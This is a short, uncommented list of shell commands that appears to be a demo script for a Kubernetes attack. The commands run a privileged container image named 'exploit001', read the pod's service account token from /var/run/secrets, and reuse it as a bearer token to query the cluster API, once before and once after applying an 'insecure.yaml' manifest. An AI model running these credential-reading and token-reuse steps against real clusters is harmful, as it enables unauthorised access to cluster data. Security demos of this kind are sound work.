kubectl delete -f insecure.yaml

docker run --rm -it --privileged -p 8080:80 denhamparry/exploit001:0.0.1
docker exec -it 435 bash
cd var
ls
cd run
ls
cd secrets

kubectl get pods
kubectl exec -it bashandcurl bash
curl -k https://kubernetes/
curl -k https://kubernetes/api/v1/namespaces/default/pods
cd var
ls
cd run
ls
cd secrets
ls
cd kubernetes.io/
ls
cd serviceaccount/
ls
cat token
export TOKEN=`cat token`
echo $TOKEN

curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/pods

exit

kubectl apply -f insecure.yaml
kubectl exec -it bashandcurl bash
export TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token` && echo $TOKEN
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/pods
!! | grep "bash"